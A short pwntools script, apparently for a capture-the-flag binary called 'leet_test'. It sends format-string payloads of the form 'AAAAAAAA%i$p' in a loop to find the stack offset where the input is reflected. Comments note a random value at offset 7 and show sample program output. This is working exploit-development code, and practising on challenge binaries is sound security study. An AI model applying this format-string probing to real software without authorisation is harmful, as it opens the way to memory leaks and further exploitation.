from pwn import *


elf = context.binary = ELF('./leet_test')
context.log_level = 'error'

io = process(elf.path)

for i in range(1000):
    io.recvuntil(b'Please enter your name: ')
    io.sendline(f'AAAAAAAA%{i}$p'.encode())
    io.recvuntil(b'Hello, ')
    response = io.recvline().strip()
    if b'0x4141414141414141' in response:
        print(f"Found leak at iteration {i}: {response.decode()}")
        break




# random value at 7


# Please enter your name: %500$p
# Hello, (nil)
# Sorry! You aren't 1337 enough :(
# Please come back later